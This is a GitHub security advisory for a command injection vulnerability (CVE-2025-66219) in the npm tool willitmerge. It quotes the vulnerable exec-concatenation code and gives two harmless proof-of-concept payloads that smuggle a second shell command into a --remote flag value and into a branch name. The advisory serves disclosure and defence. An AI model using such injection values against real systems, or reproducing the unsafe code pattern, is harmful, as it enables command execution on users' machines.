# [M] willitmerge has a Command Injection vulnerability

## Summary
Severity: Medium
Advisory: GHSA-j9wj-m24m-7jj6
CVE: CVE-2025-66219
CWE: CWE-77
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X (CVSS_V4)
Published: 2025-11-26
Source: https://github.com/advisories/GHSA-j9wj-m24m-7jj6
Type: github-advisory

## Affected
- npm: `willitmerge` — affected >=0

## Details
willitmerge describes itself as a command line tool to check if pull requests are mergeable. There is a Command Injection vulnerability in version `willitmerge@0.2.1`.

Resources: 
 * Project's GitHub source code: https://github.com/shama/willitmerge/
 * Project's npm package: https://www.npmjs.com/package/willitmerge

## Background on exploitation

Reporting a Command Injection vulnerability in `willitmerge` npm package.

A security vulnerability manifests in this package due to the use of insecure child process execution API (`exec`) to which it concateanes user input, whether provided to the command-line flag, or is in user control in the target repository.

## Exploit 

### POC 1

1. Install `willitmerge`
2. Run it with the following command

```sh
willitmerge --verbose --remote "https://github.com/lirantal/npq.git; touch /tmp/hel"
```

3. Confirm the file `/tmp/hel` is created on disk

### GitHub-sourced attack vector

[Lines 189-197](https://github.com/shama/willitmerge/blob/2fe91d05191fb05ac6da685828d109a3a5885028/lib/willitmerge.js#L189-L197) in `lib/willitmerge.js`
pass user input controlled by repository collaborators into the git command:

```js
  var cmds = [
    'git checkout -b ' + branch + ' ' + that.options.remote + '/' + iss.base.ref,
    'git remote add ' + branch + ' ' + gitUrl,
    'git pull ' + branch + ' ' + iss.head.ref,
    'git reset --merge HEAD',
    'git checkout ' + origBranch,
    'git branch -D ' + branch,
    'git remote rm ' + branch
  ];
```

Users creating malicious branch names such as `;{echo,hello,world}>/tmp/c`

This is a similar attack vector to that which was reported for the [pullit vulnerability (https://security.snyk.io/vuln/npm:pullit:20180214)

# Author

Liran Tal

## References
- https://github.com/shama/willitmerge/security/advisories/GHSA-j9wj-m24m-7jj6
- https://nvd.nist.gov/vuln/detail/CVE-2025-66219
- https://github.com/shama/willitmerge
- https://github.com/shama/willitmerge/blob/2fe91d05191fb05ac6da685828d109a3a5885028/lib/willitmerge.js#L189-L197
